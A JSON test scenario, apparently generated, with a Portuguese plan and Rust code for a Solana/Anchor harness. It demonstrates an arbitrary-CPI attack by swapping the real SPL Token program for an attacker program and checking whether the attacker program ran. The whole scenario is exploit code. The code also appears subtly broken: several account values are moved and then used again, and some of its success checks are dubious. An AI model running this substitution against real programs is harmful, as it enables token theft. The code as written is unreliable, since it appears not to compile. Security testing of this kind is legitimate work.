{
  "plan": "O cenário monta contas de token SPL legítimas (source, destination, authority) e um programa atacante no lugar do token_program. O baseline usa o SPL Token real como token_program e deve ter sucesso. O ataque substitui o token_program pelo programa do atacante, mantendo as demais contas iguais. O efeito mede se o programa atacante foi invocado (ex.: lamports transferidos ou dados alterados pelo atacante), o que não ocorre no baseline.",
  "scenario": "let attacker_program = env.attacker_program.expect("attacker program required");

// Contas de token SPL legítimas (apenas para o baseline; o ataque não as usa de verdade)
let source = Pubkey::new_unique();
let destination = Pubkey::new_unique();
let authority = Pubkey::new_unique();

let source_account = account(&spl_token::id(), &[0u8; 165], None);
let destination_account = account(&spl_token::id(), &[0u8; 165], None);
let authority_account = wallet(1_000_000_000);

// Programa SPL Token real
let token_program_account = program_account(&spl_token::id());

// Programa atacante
let attacker_program_account = program_account(&attacker_program);

// Baseline: usa o SPL Token real como token_program
let baseline_ix = env.anchor_ix(
    "cpi",
    &(100u64,),
    vec![
        AccountMeta::new(source, false),
        AccountMeta::new(destination, false),
        AccountMeta::new_readonly(authority, true),
        AccountMeta::new_readonly(spl_token::id(), false),
    ],
);
let baseline_accounts = vec![
    (source, source_account.clone()),
    (destination, destination_account.clone()),
    (authority, authority_account.clone()),
    (spl_token::id(), token_program_account.clone()),
];
let baseline_result = env.baseline("cpi legítimo com SPL Token", &baseline_ix, &baseline_accounts);

// Ataque: substitui o token_program pelo programa do atacante
let attack_ix = env.anchor_ix(
    "cpi",
    &(100u64,),
    vec![
        AccountMeta::new(source, false),
        AccountMeta::new(destination, false),
        AccountMeta::new_readonly(authority, true),
        AccountMeta::new_readonly(attacker_program, false),
    ],
);
let attack_accounts = vec![
    (source, source_account),
    (destination, destination_account),
    (authority, authority_account),
    (attacker_program, attacker_program_account),
];
let attack_result = env.attack("cpi com token_program malicioso", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    // O ataque é bem-sucedido se o programa atacante foi invocado.
    // Como o atacante pode alterar lamports ou dados, verificamos se a conta do atacante
    // teve seus lamports reduzidos (indicando execução) ou se alguma conta de token foi modificada.
    let attacker_after = after(&attack_result, &attacker_program);
    let source_after = after(&attack_result, &source);
    let destination_after = after(&attack_result, &destination);

    // Condição 1: o programa atacante foi executado (lamports da conta do programa diminuíram)
    let attacker_lamports_before = attacker_program_account.lamports();
    let attacker_lamports_after = attacker_after.lamports();
    env.effect(
        "programa atacante foi invocado (lamports reduzidos)",
        attacker_lamports_after < attacker_lamports_before,
    );

    // Condição 2: os dados da conta source foram alterados pelo atacante
    let source_data_before = source_account.data();
    let source_data_after = source_after.data();
    env.effect(
        "dados da conta source alterados pelo atacante",
        source_data_after != source_data_before,
    );

    // Condição 3: os dados da conta destination foram alterados pelo atacante
    let destination_data_before = destination_account.data();
    let destination_data_after = destination_after.data();
    env.effect(
        "dados da conta destination alterados pelo atacante",
        destination_data_after != destination_data_before,
    );
}"
}

